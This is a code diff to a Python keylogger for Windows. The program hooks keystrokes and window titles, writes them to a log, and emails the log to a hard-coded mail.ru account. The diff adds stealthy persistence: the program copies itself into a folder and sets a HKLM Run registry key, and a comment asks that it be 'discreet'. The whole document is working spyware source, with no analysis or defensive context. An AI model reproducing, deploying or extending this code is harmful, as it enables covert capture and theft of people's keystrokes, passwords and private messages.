@@ -1,4 +1,4 @@
-import pythoncom, pyHook, threading, os, time, shutil 
+import pythoncom, pyHook, threading, os, time, shutil, sys
 #This allow us to capture de windows name where the key is pressed
 from win32gui import GetWindowText, GetForegroundWindow
 
@@ -10,10 +10,15 @@ mainList = []
 #this list will be a copy of mainList when we set the signal to write in to the log file 
 auxList = []
 
-#path of the log file, be careful of choose a good place
-dirLog = 'log.txt'
-#path of the copy log file,in this case I will send a log file with the name of the user 
-dirCopy = 'log%s.txt' %os.getlogin()
+#directory where we want to store the program
+dirProgram = 'c:' + '\Folder'
+#full path of the log file, be careful of choose a good place
+dirLog = dirProgram + '\log.txt'
+#full path of the copy log file that will be send by mail ,in this case I will send a log file with the name of the user 
+dirCopy = dirProgram + '\log%s.txt' %os.getlogin()
+#full path of the program we want, necesary for set the registry key 
+pathProgram = dirProgram + '\\' + os.path.basename(sys.argv[0])
+#name of the app that we want to store in the registry key, be discreet
 
 #email 
 user = 'systemclear3@mail.ru'
@@ -39,7 +44,7 @@ def OnKeyboardEvent(event):
 	if window != lastWindow:
 		auxWindow = lastWindow
 		lastWindow = window
-		#now we have to check if the user typed something
+		#now we have to check if the user typed something valid
 		if len(mainList) > 0:
 			auxList = list(mainList)
 			mainList.clear()
@@ -114,47 +119,72 @@ def sendMail():
 	from email.mime.multipart import MIMEMultipart
     
 	while 1:
-		#check if the logfile have something
-		b = os.path.getsize(dirLog)
-		if b > 0 :	
-			shutil.copy(dirLog, dirCopy)
-			# Create the enclosing (outer) message
-			outer = MIMEMultipart()
-			outer['Subject'] = os.getlogin()
-			outer['To'] = recipient
-			outer['From'] = user
-			outer.preamble = 'You will not see this in a MIME-aware mail reader.\n'
-			try:
-				with open(dirCopy, 'rb') as fp:
-					msg = MIMEBase('application', "octet-stream")
-					msg.set_payload(fp.read())
-				encoders.encode_base64(msg)
-				msg.add_header('Content-Disposition', 'attachment', filename=os.path.basename(dirCopy))
-				outer.attach(msg)
-			except:
-				print("Unable to open one of the attachments. Error: ", sys.exc_info()[0])
-				pass
+		if os.path.isfile(dirLog):
+			#check if the logfile have something
+			b = os.path.getsize(dirLog)
+			if b > 0 :	
+				shutil.copy(dirLog, dirCopy)
+				# Create the enclosing (outer) message
+				outer = MIMEMultipart()
+				outer['Subject'] = os.getlogin()
+				outer['To'] = recipient
+				outer['From'] = user
+				outer.preamble = 'You will not see this in a MIME-aware mail reader.\n'
+				try:
+					with open(dirCopy, 'rb') as fp:
+						msg = MIMEBase('application', "octet-stream")
+						msg.set_payload(fp.read())
+					encoders.encode_base64(msg)
+					msg.add_header('Content-Disposition', 'attachment', filename=os.path.basename(dirCopy))
+					outer.attach(msg)
+				except:
+					print("Unable to open one of the attachments. Error: ", sys.exc_info()[0])
+					pass
 
-			composed = outer.as_string()
-				
-			try:
-				with smtplib.SMTP('smtp.mail.ru', 587) as s:
-					s.ehlo()
-					s.starttls()
-					s.ehlo()
-					s.login(user, pwd)
-					s.sendmail(user, recipient, composed)
-					s.close()		
-				print("Email sent!")
-				os.remove(dirLog)
-				f = open(dirLog, 'a')
-				f.close()
-				
-			except:
-				print("Unable to send the email. Error: ", sys.exc_info()[0])
-				pass
-			os.remove(dirCopy)
+				composed = outer.as_string()
+					
+				try:
+					with smtplib.SMTP('smtp.mail.ru', 587) as s:
+						s.ehlo()
+						s.starttls()
+						s.ehlo()
+						s.login(user, pwd)
+						s.sendmail(user, recipient, composed)
+						s.close()		
+					print("Email sent!")
+					os.remove(dirLog)
+					f = open(dirLog, 'a')
+					f.close()
+					
+				except:
+					print("Unable to send the email. Error: ", sys.exc_info()[0])
+					pass
+				os.remove(dirCopy)
+		else:
+			print("No existe el archivo")
 		time.sleep(delay)
+
+#set a registry value to start our program with windows 
+def launchAtStart():
+	#first of all we have to check if the path that we want exists
+	if not os.path.exists(dirProgram):
+		os.makedirs(dirProgram)
+		#copy the program to the new folder
+		shutil.copy(sys.argv[0], dirProgram)
+		#create the registry key 
+		from win32api import (GetModuleFileName, RegCloseKey, RegDeleteValue,
+						  RegOpenKeyEx, RegSetValueEx)
+
+		from win32con import HKEY_LOCAL_MACHINE, KEY_WRITE, REG_SZ
+		SUBKEY = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
+		
+		key = RegOpenKeyEx(HKEY_LOCAL_MACHINE, SUBKEY, 0, KEY_WRITE)
+		flag = RegSetValueEx(key, appName, 0, REG_SZ, pathProgram)
+		RegCloseKey(key)
+		
+		return 1
+	
+	return 0 
 
 '''We will use threads for various things'''
 #This is the thread that handle the main function
@@ -189,13 +219,27 @@ class mailThread (threading.Thread):
 	def run(self):
 		print ("Starting " + self.name)
 		sendMail()
+		
+#Thread for set the program with windows start 
+class startUpThread (threading.Thread):
+	def __init__(self, threadID, name, counter):
+		threading.Thread.__init__(self)
+		self.threadID = threadID
+		self.name = name
+		self.counter = counter
+	def run(self):
+		print ("Starting " + self.name)
+		launchAtStart()
 
 e = threading.Event()	
-		
+
 main = mainThread(1, "mainThread", 1)
 wait = waiterThread(2, "waiterThread", 2)
 mail = mailThread(3, "mailThread", 3)
+startUp = startUpThread(4, "startUpThread", 4)
 
+startUp.start()
+time.sleep(3)
 wait.start()
 main.start()
 time.sleep(3)
